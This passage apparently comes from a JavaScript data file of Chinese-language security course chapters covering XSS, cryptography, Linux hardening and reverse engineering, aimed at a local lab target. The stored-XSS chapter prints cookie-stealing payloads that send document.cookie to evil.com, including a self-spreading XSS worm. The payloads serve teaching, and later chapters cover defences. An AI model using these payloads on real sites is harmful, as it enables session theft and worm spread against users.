python target4_xss.py 8084
\`\`\`

尝试以下 Payload：
1. \`<script>alert(document.cookie)<\/script>\`
2. \`<img src=x onerror=alert(1)>\`
3. \`<svg onload=alert(1)>\`

> 目标：触发弹窗，证明 XSS 存在。
`},{id:21,course_id:5,title:"第三章：存储型 XSS",order:3,content:`# 存储型 XSS

存储型 XSS 危害最大，脚本存入数据库，影响所有访问用户。

## 攻击场景

### 1. 评论区

\`\`\`html
<!-- 发表评论 -->
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
<\/script>

<!-- 其他用户加载评论时执行 -->
\`\`\`

### 2. 个人简介

\`\`\`html
<!-- 修改个人资料 -->
<img src=x onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">

<!-- 其他用户查看该用户资料时执行 -->
\`\`\`

### 3. 论坛帖子

\`\`\`html
<!-- 发布帖子 -->
<svg onload="fetch('http://evil.com/steal?cookie='+document.cookie)"></svg>

<!-- 所有查看该帖的用户受影响 -->
\`\`\`

## 实战案例

### 案例 1：窃取管理员 Cookie

**步骤**：
1. 注册普通账户
2. 在评论区发布存储型 XSS
3. 等待管理员访问该页面
4. 管理员 Cookie 发送到攻击者服务器
5. 使用管理员 Cookie 登录

**Payload**：
\`\`\`javascript
<script>
  // 只在管理员账户执行
  if (document.cookie.includes('admin')) {
    fetch('http://evil.com/admin?cookie=' + document.cookie);
  }
<\/script>
\`\`\`

### 案例 2：XSS 蠕虫

**原理**：XSS 自动传播，感染所有用户

**示例**（假设社交网站）：
\`\`\`javascript
<script>
  // 1. 窃取当前用户 Cookie
  fetch('http://evil.com/steal?cookie=' + document.cookie);
  
  // 2. 以当前用户身份发布新评论（包含相同 Payload）
  fetch('/post/comment', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</' + 'script>'
    })
  });
<\/script>
\`\`\`

**效果**：
- 用户 A 访问页面 → 被感染
- 用户 A 自动发布恶意评论
- 用户 B 访问该评论 → 被感染
- 指数级传播

## 靶机实战

启动靶机：
\`\`\`bash
python target4_xss.py 8084
\`\`\`

如果靶机有评论功能，尝试：
1. 发布评论：\`<script>alert('XSS')<\/script>\`
2. 刷新页面，查看是否弹窗
3. 如果弹窗，说明存在存储型 XSS

> 注意：存储型 XSS 需要脚本持久化，刷新后仍执行。
`},{id:22,course_id:5,title:"第四章：XSS 防御方案",order:4,content:`# XSS 防御方案

## 1. 输出转义（核心防御）

根据输出位置选择转义方式。

### HTML 内容转义

\`\`\`python
# Python
import html

user_input = "<script>alert(1)<\/script>"
safe_output = html.escape(user_input)
# 结果：&lt;script&gt;alert(1)&lt;/script&gt;
\`\`\`

\`\`\`javascript
// JavaScript
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
\`\`\`

### 属性值转义

\`\`\`html
<!-- 危险 -->
<input value="\${userInput}">

<!-- 安全：转义双引号 -->
<input value="\${escapeHTML(userInput)}">
\`\`\`

### JavaScript 变量转义

\`\`\`javascript
// 危险
var username = "\${userInput}";

// 安全：JSON 编码
var username = \${JSON.stringify(userInput)};
\`\`\`

### URL 参数转义

\`\`\`javascript
// 危险
location.href = "http://target.com/page?name=" + userInput;

// 安全：URL 编码
location.href = "http://target.com/page?name=" + encodeURIComponent(userInput);
\`\`\`

## 2. 使用安全 API

\`\`\`javascript
// 危险：innerHTML
element.innerHTML = userInput;

// 安全：textContent
element.textContent = userInput;

// 安全：innerText
element.innerText = userInput;
\`\`\`

## 3. Content Security Policy（CSP）

**HTTP 头部**：
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
\`\`\`

**作用**：
- 限制脚本来源
- 禁止内联脚本
- 禁止 eval()

**示例**：
\`\`\`html
<!-- 允许加载同源资源 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">

<!-- 允许加载指定 CDN -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://cdn.example.com">
\`\`\`

## 4. HttpOnly Cookie

\`\`\`python
# Python Flask
response.set_cookie('session', value, httponly=True)
\`\`\`

\`\`\`javascript
// JavaScript 无法读取
// document.cookie 不包含 HttpOnly Cookie
\`\`\`

**作用**：即使存在 XSS，也无法窃取 Cookie。

## 5. 输入验证

\`\`\`python
# 白名单验证：只允许字母数字
if not re.match(r'^[a-zA-Z0-9]+$', username):
    raise ValueError("Invalid username")

# 黑名单过滤（不推荐，容易绕过）
blacklist = ['<script>', '<\/script>']
for item in blacklist:
    user_input = user_input.replace(item, '')
\`\`\`

## 6. 框架自动转义

**React**：
\`\`\`jsx
// 自动转义，安全
<div>{userInput}</div>

// 危险：需要显式禁用转义
<div dangerouslySetInnerHTML={{__html: userInput}} />
\`\`\`

**Vue**：
\`\`\`vue
<!-- 自动转义，安全 -->
<div>{{ userInput }}</div>

<!-- 危险：不转义 -->
<div v-html="userInput"></div>
\`\`\`

**Django**：
\`\`\`django
<!-- 自动转义，安全 -->
<div>{{ user_input }}</div>

<!-- 危险：禁用转义 -->
<div>{{ user_input|safe }}</div>
\`\`\`

## 7. 安全开发流程

1. **代码审查**：检查所有用户输入是否转义
2. **静态分析**：使用 ESLint、SonarQube 扫描
3. **动态测试**：使用 XSS Scanner 测试
4. **安全培训**：开发人员了解 XSS 原理

## 靶机实战

修复靶机中的 XSS 漏洞：

**修复前**（target4_xss.py）：
\`\`\`python
# 直接输出用户输入
return f"<html><body>搜索结果：{query}</body></html>"
\`\`\`

**修复后**：
\`\`\`python
import html
safe_query = html.escape(query)
return f"<html><body>搜索结果：{safe_query}</body></html>"
\`\`\`

> 验证：输入 \`<script>alert(1)<\/script>\`，修复后应显示转义后的文本。
`}]},{id:6,title:"密码学基础",description:"理解对称加密、非对称加密、哈希算法、数字签名等核心概念。",status:"published",chapters:[{id:23,course_id:6,title:"第一章：对称加密",order:1,content:`# 对称加密

加密和解密使用相同密钥。

## 常见算法

| 算法 | 密钥长度 | 安全性 | 速度 |
|---|---|---|---|
| DES | 56 位 | 不安全 | 快 |
| 3DES | 168 位 | 中等 | 慢 |
| AES | 128/256 位 | 安全 | 快 |
| ChaCha20 | 256 位 | 安全 | 快 |

## AES（Advanced Encryption Standard）

**工作模式**：
- **ECB**：电子密码本（不安全，相同明文产生相同密文）
- **CBC**：密码块链接（需 IV，推荐）
- **GCM**：伽罗瓦计数器（认证加密，推荐）

**Python 示例**：
\`\`\`python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# 生成密钥和 IV
key = os.urandom(32)  # 256 位
iv = os.urandom(16)   # 128 位

# 加密
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
encryptor = cipher.encryptor()
ciphertext = encryptor.update(b"secret message") + encryptor.finalize()

# 解密
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
plaintext = decryptor.update(ciphertext) + decryptor.finalize()
\`\`\`

## 实战应用

- HTTPS 通信（TLS 握手后使用对称加密）
- 文件加密（VeraCrypt、BitLocker）
- 数据库加密

## 攻击方式

- **暴力破解**：密钥空间不足（DES 56 位）
- **侧信道攻击**：通过功耗、时间推断密钥
- **填充预言攻击**：CBC 模式实现不当
`},{id:24,course_id:6,title:"第二章：非对称加密",order:2,content:`# 非对称加密

使用公钥加密、私钥解密，解决密钥分发问题。

## 核心概念

- **公钥**：公开，用于加密
- **私钥**：保密，用于解密
- **数学基础**：大数分解（RSA）、椭圆曲线（ECC）

## RSA 算法

**原理**：
1. 选择两个大素数 p、q
2. 计算 n = p × q
3. 计算欧拉函数 φ(n) = (p-1)(q-1)
4. 选择 e，使得 1 < e < φ(n)，且 gcd(e, φ(n)) = 1
5. 计算 d，使得 e × d ≡ 1 (mod φ(n))
6. 公钥 (n, e)，私钥 (n, d)

**Python 示例**：
\`\`\`python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# 生成密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()

# 加密
message = b"secret message"
ciphertext = public_key.encrypt(
    message,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# 解密
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
\`\`\`

## ECC（椭圆曲线加密）

**优势**：
- 相同安全性，密钥更短（256 位 ECC ≈ 3072 位 RSA）
- 计算更快
- 适合移动设备

**应用**：
- TLS 1.3（默认使用 ECC）
- 比特币、以太坊
- iMessage、Signal

## 实战应用

- **数字签名**：私钥签名、公钥验证
- **密钥交换**：Diffie-Hellman
- **证书**：X.509 证书包含公钥

## 攻击方式

- **大数分解**：Shor 算法（量子计算）
- **侧信道攻击**：时序攻击、功耗分析
- **弱随机数**：密钥生成使用弱随机数生成器
`},{id:25,course_id:6,title:"第三章：哈希算法",order:3,content:`# 哈希算法

将任意长度数据映射为固定长度摘要，不可逆。

## 特性

- **确定性**：相同输入产生相同输出
- **快速计算**：任意长度数据快速生成摘要
- **不可逆**：无法从摘要还原原始数据
- **抗碰撞**：难以找到两个不同输入产生相同摘要
- **雪崩效应**：输入微小变化导致输出巨大变化

## 常见算法

| 算法 | 摘要长度 | 安全性 | 用途 |
|---|---|---|---|
| MD5 | 128 位 | 不安全 | 校验和（不用于安全） |
| SHA-1 | 160 位 | 不安全 | 已淘汰 |
| SHA-256 | 256 位 | 安全 | 比特币、证书 |
| SHA-3 | 可变 | 安全 | 新一代标准 |
| bcrypt | 可变 | 安全 | 密码存储 |
| Argon2 | 可变 | 安全 | 密码存储（推荐） |

## 密码存储

**错误做法**：
\`\`\`python
# 危险：直接存储 MD5
password_hash = hashlib.md5(password.encode()).hexdigest()
\`\`\`

**正确做法**：
\`\`\`python
# 使用 bcrypt 加盐哈希
import bcrypt

# 生成盐并哈希
salt = bcrypt.gensalt()
password_hash = bcrypt.hashpw(password.encode(), salt)

# 验证
if bcrypt.checkpw(password.encode(), stored_hash):
    print("密码正确")
\`\`\`

## 攻击方式

**彩虹表**：
- 预计算常见密码的哈希值
- 防御：加盐（salt）

**暴力破解**：
- 尝试所有可能组合
- 防御：使用慢速哈希（bcrypt、Argon2）

**碰撞攻击**：
- 找到两个不同输入产生相同哈希
- MD5、SHA-1 已被攻破

## 实战应用

- **密码存储**：bcrypt、Argon2
- **文件校验**：SHA-256
- **数字签名**：先哈希再签名
- **区块链**：工作量证明（PoW）
`},{id:26,course_id:6,title:"第四章：数字签名与证书",order:4,content:`# 数字签名与证书

## 数字签名

**原理**：
1. 发送方对消息哈希
2. 用私钥加密哈希值（签名）
3. 接收方用公钥解密签名
4. 对比哈希值验证完整性

**Python 示例**：
\`\`\`python
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

# 生成密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 签名
message = b"important message"
signature = private_key.sign(
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# 验证
try:
    public_key.verify(
        signature,
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("签名有效")
except Exception:
    print("签名无效")
\`\`\`

## X.509 证书

**内容**：
- 版本号
- 序列号
- 签名算法
- 颁发者（CA）
- 有效期
- 主体（域名/组织）
- 公钥
- CA 数字签名

**证书链**：
\`\`\`
根证书（自签名）
  └─ 中间证书
      └─ 服务器证书
\`\`\`

**验证过程**：
1. 浏览器获取服务器证书
2. 查找颁发该证书的 CA
3. 验证 CA 签名
4. 检查有效期、域名匹配
5. 检查是否被吊销（CRL/OCSP）

## 证书颁发机构（CA）

**知名 CA**：
- Let's Encrypt（免费）
- DigiCert
- Comodo
- GlobalSign

**免费证书**：
\`\`\`bash
# 使用 certbot 申请 Let's Encrypt 证书
certbot certonly --webroot -w /var/www/html -d example.com
\`\`\`

## 实战应用

- **HTTPS**：TLS 证书验证服务器身份
- **代码签名**：验证软件来源
- **邮件签名**：S/MIME、PGP
- **文档签名**：PDF 数字签名

## 攻击方式

**中间人攻击**：
- 伪造证书
- 防御：证书固定（Certificate Pinning）

**CA 被入侵**：
- 颁发虚假证书
- 防御：CT（Certificate Transparency）日志

**证书过期**：
- 服务中断
- 防御：自动续期（Let's Encrypt）
`}]},{id:7,title:"Linux 安全加固",description:"掌握 Linux 系统安全配置、权限管理、日志审计、入侵检测。",status:"published",chapters:[{id:27,course_id:7,title:"第一章：用户与权限管理",order:1,content:`# 用户与权限管理

## 用户管理

**创建用户**：
\`\`\`bash
# 创建用户并设置密码
useradd -m -s /bin/bash username
passwd username

# 创建用户并指定组
useradd -m -g developers username

# 删除用户
userdel -r username  # -r 删除家目录
\`\`\`

**用户组**：
\`\`\`bash
# 创建组
groupadd developers

# 将用户添加到组
usermod -aG developers username

# 查看用户所属组
groups username
id username
\`\`\`

## 文件权限

**权限说明**：
\`\`\`
-rwxr-xr-- 1 owner group 4096 Jan 1 12:00 file.txt
│├├├├├├├├┤
│ │ │ └─ 其他用户：读（r--）
│ │ └─── 组成员：读执行（r-x）
│ └───── 所有者：读执行（rwx）
└─────── 文件类型（- 普通文件，d 目录）
\`\`\`

**修改权限**：
\`\`\`bash
# 数字方式
chmod 755 file.txt  # rwxr-xr-x
chmod 644 file.txt  # rw-r--r--
chmod 600 file.txt  # rw-------

# 符号方式
chmod u+x file.txt  # 所有者添加执行权限
chmod g-w file.txt  # 组移除写权限
chmod o=r file.txt  # 其他用户只读
\`\`\`

**修改所有者**：
\`\`\`bash
chown user:group file.txt
chown -R user:group directory/
\`\`\`

## 特殊权限

**SUID（4）**：
\`\`\`bash
chmod u+s /usr/bin/passwd
# 执行时以文件所有者身份运行
\`\`\`

**SGID（2）**：
\`\`\`bash
chmod g+s directory/
# 目录中新文件继承组
\`\`\`

**Sticky Bit（1）**：
\`\`\`bash
chmod +t /tmp
# 只有文件所有者能删除自己的文件
\`\`\`

## sudo 配置

**编辑 sudoers**：
\`\`\`bash
visudo
\`\`\`

**配置示例**：
\`\`\`
# 允许 developers 组执行所有命令
%developers ALL=(ALL) ALL

# 允许 username 无需密码执行特定命令
username ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx

# 限制只能执行特定命令
username ALL=(root) /usr/bin/apt update, /usr/bin/apt upgrade
\`\`\`

## 最佳实践

1. **最小权限原则**：用户只获得必要权限
2. **禁用 root 登录**：使用 sudo 提权
3. **定期审计**：检查 \`/etc/passwd\`、\`/etc/shadow\`
4. **密码策略**：使用 PAM 模块强制复杂密码
5. **账户锁定**：失败多次后锁定账户
`},{id:28,course_id:7,title:"第二章：SSH 安全配置",order:2,content:`# SSH 安全配置

## 配置文件

\`/etc/ssh/sshd_config\`

## 基础加固

\`\`\`bash
# 禁用 root 登录
PermitRootLogin no

# 禁用密码认证（仅允许密钥）
PasswordAuthentication no

# 限制登录用户
AllowUsers username1 username2

# 限制登录组
AllowGroups sshusers developers

# 修改默认端口
Port 2222

# 禁用空密码
PermitEmptyPasswords no

# 限制认证尝试次数
MaxAuthTries 3

# 设置登录超时
LoginGraceTime 60
\`\`\`

## 密钥认证

**生成密钥对**：
\`\`\`bash
# 客户端生成
ssh-keygen -t ed25519 -C "user@example.com"

# 复制公钥到服务器
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server
\`\`\`

**服务器配置**：
\`\`\`bash
# 禁用密码认证
PasswordAuthentication no

# 启用公钥认证
PubkeyAuthentication yes

# 指定授权密钥文件
AuthorizedKeysFile .ssh/authorized_keys
\`\`\`

## 双因素认证（2FA）

**安装 Google Authenticator**：
\`\`\`bash
apt install libpam-google-authenticator
\`\`\`

**配置 PAM**：
\`\`\`bash
# 编辑 /etc/pam.d/sshd
auth required pam_google_authenticator.so
\`\`\`

**配置 SSH**：
\`\`\`bash
# /etc/ssh/sshd_config
ChallengeResponseAuthentication yes
UsePAM yes
\`\`\`

**用户设置**：
\`\`\`bash
google-authenticator
# 扫描二维码，保存恢复码
\`\`\`

## 失败防护

**fail2ban**：
\`\`\`bash
apt install fail2ban

# 配置 /etc/fail2ban/jail.local
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600
\`\`\`

**启动服务**：
\`\`\`bash
systemctl enable fail2ban
systemctl start fail2ban
\`\`\`

## 端口转发

**本地转发**：
\`\`\`bash
# 将本地 8080 转发到远程 80
ssh -L 8080:localhost:80 user@server
\`\`\`

**远程转发**：
\`\`\`bash
# 将远程 8080 转发到本地 80
ssh -R 8080:localhost:80 user@server
\`\`\`

**动态转发（SOCKS 代理）**：
\`\`\`bash
ssh -D 1080 user@server
# 配置浏览器使用 SOCKS5 代理 127.0.0.1:1080
\`\`\`

## 审计日志

\`\`\`bash
# 查看 SSH 登录日志
grep sshd /var/log/auth.log

# 查看成功登录
grep "Accepted" /var/log/auth.log

# 查看失败登录
grep "Failed" /var/log/auth.log
\`\`\`
`},{id:29,course_id:7,title:"第三章：防火墙与网络",order:3,content:`# 防火墙与网络

## iptables

**基础规则**：
\`\`\`bash
# 查看规则
iptables -L -n -v

# 允许 SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# 允许 HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 允许已建立的连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 默认拒绝所有入站
iptables -P INPUT DROP

# 默认允许所有出站
iptables -P OUTPUT ACCEPT
\`\`\`

**保存规则**：
\`\`\`bash
# Debian/Ubuntu
apt install iptables-persistent
netfilter-persistent save

# CentOS/RHEL
service iptables save
\`\`\`

## UFW（Uncomplicated Firewall）

**基础命令**：
\`\`\`bash
# 启用防火墙
ufw enable

# 允许 SSH
ufw allow ssh
ufw allow 22/tcp

# 允许 HTTP/HTTPS
ufw allow http
ufw allow https

# 允许端口范围
ufw allow 8000:9000/tcp

# 允许特定 IP
ufw allow from 192.168.1.100

# 查看状态
ufw status verbose

# 删除规则
ufw delete allow ssh
\`\`\`

## firewalld

**基础命令**：
\`\`\`bash
# 启动服务
systemctl start firewalld
systemctl enable firewalld

# 查看状态
firewall-cmd --state

# 允许服务
firewall-cmd --add-service=http --permanent
firewall-cmd --add-service=https --permanent

# 允许端口
firewall-cmd --add-port=8080/tcp --permanent

# 重新加载
firewall-cmd --reload

# 查看规则
firewall-cmd --list-all
\`\`\`

## TCP Wrappers

**配置文件**：
- \`/etc/hosts.allow\`：允许列表
- \`/etc/hosts.deny\`：拒绝列表

**示例**：
\`\`\`bash
# /etc/hosts.allow
sshd: 192.168.1. 10.0.0.
sshd: .example.com

# /etc/hosts.deny
ALL: ALL
\`\`\`

## 网络隔离

**VLAN**：
\`\`\`bash
# 创建 VLAN 接口
ip link add link eth0 name eth0.10 type vlan id 10
ip addr add 192.168.10.1/24 dev eth0.10
ip link set eth0.10 up
\`\`\`

**网络命名空间**：
\`\`\`bash
# 创建命名空间
ip netns add red
ip netns add blue

# 在命名空间中执行命令
ip netns exec red ip addr add 10.0.0.1/24 dev veth-red
ip netns exec red ip link set lo up
\`\`\`

## 入侵检测

**AIDE（文件完整性监控）**：
\`\`\`bash
apt install aide

# 初始化数据库
aideinit

# 检查文件变化
aide --check
\`\`\`

**OSSEC（主机入侵检测）**：
\`\`\`bash
# 监控文件变化、日志、rootkit
# 配置 /var/ossec/etc/ossec.conf
\`\`\`
`},{id:30,course_id:7,title:"第四章：日志与审计",order:4,content:`# 日志与审计

## 系统日志

**日志位置**：
- \`/var/log/syslog\`：系统日志（Debian/Ubuntu）
- \`/var/log/messages\`：系统日志（CentOS/RHEL）
- \`/var/log/auth.log\`：认证日志
- \`/var/log/secure\`：安全日志
- \`/var/log/kern.log\`：内核日志

**查看日志**：
\`\`\`bash
# 实时查看
tail -f /var/log/auth.log

# 搜索关键词
grep "Failed" /var/log/auth.log

# 查看最近 100 行
tail -n 100 /var/log/syslog
\`\`\`

## journald

**journalctl 命令**：
\`\`\`bash
# 查看所有日志
journalctl

# 实时查看
journalctl -f

# 查看特定服务
journalctl -u sshd
journalctl -u nginx

# 查看最近 1 小时
journalctl --since "1 hour ago"

# 查看特定时间
journalctl --since "2026-01-01 00:00:00" --until "2026-01-02 00:00:00"

# 查看优先级
journalctl -p err  # 错误及以上
journalctl -p warning  # 警告及以上
\`\`\`

## auditd

**安装与启动**：
\`\`\`bash
apt install auditd
systemctl enable auditd
systemctl start auditd
\`\`\`

**配置规则**：
\`\`\`bash
# 编辑 /etc/audit/rules.d/audit.rules

# 监控文件访问
-w /etc/passwd -p wa -k passwd_access
-w /etc/shadow -p wa -k shadow_access

# 监控系统调用
-a always,exit -F arch=b64 -S execve -k exec_commands

# 监控用户登录
-w /var/log/auth.log -p wa -k auth_log

# 监控权限修改
-a always,exit -F arch=b64 -S chmod -S chown -k permission_changes
\`\`\`

**查看审计日志**：
\`\`\`bash
# 查看所有审计事件
ausearch -m USER_LOGIN

# 查看特定关键词
ausearch -k passwd_access

# 生成报告
aureport
aureport -x  # 可执行文件报告
aureport -au  # 认证报告
\`\`\`

## 日志轮转

**logrotate 配置**：
\`\`\`bash
# /etc/logrotate.d/custom
/var/log/myapp.log {
    daily           # 每天轮转
    rotate 7        # 保留 7 份
    compress        # 压缩
    delaycompress   # 延迟压缩
    missingok       # 文件不存在不报错
    notifempty      # 空文件不轮转
    create 0640 root adm  # 创建新文件权限
    postrotate
        systemctl reload myapp  # 轮转后执行
    endscript
}
\`\`\`

## 集中日志管理

**rsyslog 远程发送**：
\`\`\`bash
# /etc/rsyslog.d/remote.conf
*.* @@logserver.example.com:514  # TCP
*.* @logserver.example.com:514   # UDP
\`\`\`

**ELK Stack**：
- **Elasticsearch**：存储和搜索日志
- **Logstash**：收集和处理日志
- **Kibana**：可视化界面

**Graylog**：
- 开源日志管理
- 支持多种输入
- 强大的搜索功能

## 安全审计清单

1. **用户审计**：
   - 检查 \`/etc/passwd\` 中的异常用户
   - 检查 \`/etc/shadow\` 中的空密码
   - 检查 sudo 权限配置

2. **文件审计**：
   - 查找 SUID/SGID 文件
   - 查找全局可写文件
   - 检查关键文件权限

3. **网络审计**：
   - 检查开放端口
   - 检查监听服务
   - 检查防火墙规则

4. **日志审计**：
   - 检查失败登录
   - 检查特权操作
   - 检查异常进程
`}]},{id:8,title:"逆向工程入门",description:"学习二进制分析、反汇编、调试技术，理解软件内部工作原理。",status:"published",chapters:[{id:31,course_id:8,title:"第一章：逆向工程基础",order:1,content:`# 逆向工程基础

## 什么是逆向工程

从编译后的二进制文件还原出源代码逻辑的过程。

## 应用场景

- **恶意软件分析**：理解病毒、木马行为
- **漏洞挖掘**：发现软件缺陷
- **协议分析**：理解私有协议格式
- **软件破解**：移除保护机制（违法）
- **兼容性开发**：实现互操作性

## 法律边界

**合法**：
- 安全研究（自己的系统）
- 互操作性开发
- 恶意软件分析

**违法**：
- 破解商业软件
- 绕过 DRM
- 侵犯知识产权

## 工具链

**静态分析**：
- **IDA Pro**：商业反汇编器（强大）
- **Ghidra**：NSA 开源（免费）
- **radare2**：命令行工具（灵活）
- **objdump**：GNU 反汇编

**动态分析**：
- **GDB**：GNU 调试器
- **x64dbg**：Windows 调试器
- **OllyDbg**：经典调试器
- **Frida**：动态插桩

**辅助工具**：
- **strings**：提取字符串
- **ltrace/strace**：库调用/系统调用跟踪
- **file**：识别文件类型
- **hexdump**：十六进制查看

## 编译过程

\`\`\`
源代码 → 预处理 → 编译 → 汇编 → 链接 → 可执行文件
.c     → .i    → .s   → .o   → 二进制
\`\`\`

**静态链接**：库代码直接嵌入可执行文件
**动态链接**：运行时加载共享库（.so/.dll）

## 可执行文件格式

**Linux**：ELF（Executable and Linkable Format）
**Windows**：PE（Portable Executable）
**macOS**：Mach-O

**ELF 结构**：
- 文件头：魔数、架构、入口点
- 程序头表：段信息
- 节头表：节信息
- 代码段（.text）
- 数据段（.data）
- BSS 段（未初始化数据）
`},{id:32,course_id:8,title:"第二章：x86 汇编基础",order:2,content:"# x86 汇编基础\n\n## 寄存器\n\n**通用寄存器**（64 位）：\n- `rax`：累加器（返回值）\n- `rbx`：基址寄存器\n- `rcx`：计数器（循环）\n- `rdx`：数据寄存器（参数）\n- `rsi`：源索引\n- `rdi`：目的索引\n- `rbp`：基指针（栈底）\n- `rsp`：栈指针（栈顶）\n- `r8`-`r15`：扩展寄存器\n\n**32 位子寄存器**：`eax`、`ebx`、`ecx`、`edx`\n**16 位子寄存器**：`ax`、`bx`、`cx`、`dx`\n**8 位子寄存器**：`al`、`ah`、`bl`、`bh`\n\n## 内存寻址\n\n**立即数**：`mov eax, 42`\n**寄存器**：`mov eax, ebx`\n**直接寻址**：`mov eax, [0x400000]`\n**寄存器间接**：`mov eax, [ebx]`\n**基址+偏移**：`mov eax, [ebx+8]`\n**基址+索引+偏移**：`mov eax, [ebx+ecx*4+16]`\n\n## 常用指令\n\n**数据传送**：\n```asm\nmov dest, src    ; 传送\nlea dest, [src]  ; 加载有效地址\npush src         ; 压栈\npop dest         ; 出栈\n```\n\n**算术运算**：\n```asm\nadd dest, src    ; 加法\nsub dest, src    ; 减法\ninc dest         ; 自增\ndec dest         ; 自减\nmul src          ; 无符号乘法\ndiv src          ; 无符号除法\n```\n\n**逻辑运算**：\n```asm\nand dest, src    ; 与\nor dest, src     ; 或\nxor dest, src    ; 异或\nnot dest         ; 取反\nshl dest, count  ; 左移\nshr dest, count  ; 右移\n```\n\n**比较与跳转**：\n```asm\ncmp op1, op2     ; 比较（op1 - op2）\ntest op1, op2    ; 测试（op1 AND op2）\n\njmp label        ; 无条件跳转\nje label         ; 相等跳转（ZF=1）\njne label        ; 不等跳转（ZF=0）\njg label         ; 大于跳转（有符号）\njl label         ; 小于跳转（有符号）\nja label         ; 高于跳转（无符号）\njb label         ; 低于跳转（无符号）\n```\n\n## 函数调用\n\n**调用约定**（System V AMD64 ABI）：\n- 参数传递：`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`\n- 返回值：`rax`\n- 调用者保存：`rax`、`rcx`、`rdx`、`rsi`、`rdi`、`r8`-`r11`\n- 被调用者保存：`rbx`、`rbp`、`r12`-`r15`\n\n**函数序言**：\n```asm\npush rbp         ; 保存旧基指针\nmov rbp, rsp     ; 设置新基指针\nsub rsp, N       ; 分配栈空间\n```\n\n**函数结语**：\n```asm\nleave            ; mov rsp, rbp; pop rbp\nret              ; 返回\n```\n\n## 控制结构\n\n**if-else**：\n```asm\ncmp eax, 10\njne else_block\n; if 块代码\njmp end_if\nelse_block:\n; else 块代码\nend_if:\n```\n\n**循环**：\n```asm\nloop_start:\ncmp ecx, 0\nje loop_end\n; 循环体\ndec ecx\njmp loop_start\nloop_end:\n```\n"},{id:33,course_id:8,title:"第三章：静态分析技术",order:3,content:`# 静态分析技术

## strings 命令

**提取字符串**：
\`\`\`bash
# 默认提取 4 字节以上可打印字符串
strings binary

# 指定最小长度
strings -n 8 binary

# 显示偏移
strings -t x binary

# 提取所有编码
strings -a -e l binary  # 小端 Unicode
strings -a -e b binary  # 大端 Unicode
\`\`\`

**用途**：
- 发现硬编码密码、URL、IP
- 识别编译器、库版本
- 找到错误信息、调试字符串

## file 命令

**识别文件类型**：
\`\`\`bash
file binary
# 输出：ELF 64-bit LSB executable, x86-64

file library.so
# 输出：ELF 64-bit LSB shared object
\`\`\`

## objdump

**反汇编**：
\`\`\`bash
# 反汇编 .text 段
objdump -d binary

# 反汇编特定函数
objdump -d binary | grep -A 20 "<main>:"

# 显示节头信息
objdump -h binary

# 显示符号表
objdump -t binary

# 显示动态符号
objdump -T binary
\`\`\`

## Ghidra

**安装**：
\`\`\`bash
# 下载：https://ghidra-sre.org/
# 需要 JDK 17+
./ghidraRun
\`\`\`

**基本流程**：
1. 创建项目（New Project）
2. 导入文件（Import File）
3. 分析文件（Auto Analyze）
4. 查看反汇编（Listing）
5. 查看反编译（Decompiler）

**反编译器**：
- 将汇编还原为类 C 代码
- 识别函数、变量、结构
- 支持交叉引用

**脚本功能**：
\`\`\`python
# Ghidra 脚本示例（Jython）
from ghidra.program.model.listing import *

program = getCurrentProgram()
listing = program.getListing()

# 遍历所有函数
functions = program.getFunctionManager().getFunctions(True)
for func in functions:
    print(func.getName())
\`\`\`

## IDA Pro

**快捷键**：
- \`Space\`：切换图形/文本视图
- \`Tab\`：切换反汇编/反编译
- \`N\`：重命名变量
- \`Y\`：修改变量类型
- \`X\`：查看交叉引用
- \`G\`：跳转到地址

**插件**：
- **Hex-Rays Decompiler**：反编译器
- **IDA Python**：脚本支持
- **FindCrypt**：查找加密常量

## radare2

**基础命令**：
\`\`\`bash
# 打开文件
r2 binary

# 分析
aaa

# 查看函数
afl

# 反汇编函数
pdf @main

# 查看字符串
iz

# 查看导入
ii

# 查看导出
iE

# 搜索字符串
/ "password"

# 退出
q
\`\`\`

## 识别编译器

**GCC 特征**：
- 函数名包含 \`__libc_csu_init\`
- 使用 \`.init_array\` 段

**MSVC 特征**：
- 函数名包含 \`__security_cookie\`
- 使用 \`.pdata\` 段（异常处理）

**优化级别**：
- \`-O0\`：无优化，容易分析
- \`-O2\`：常用优化，内联、循环展开
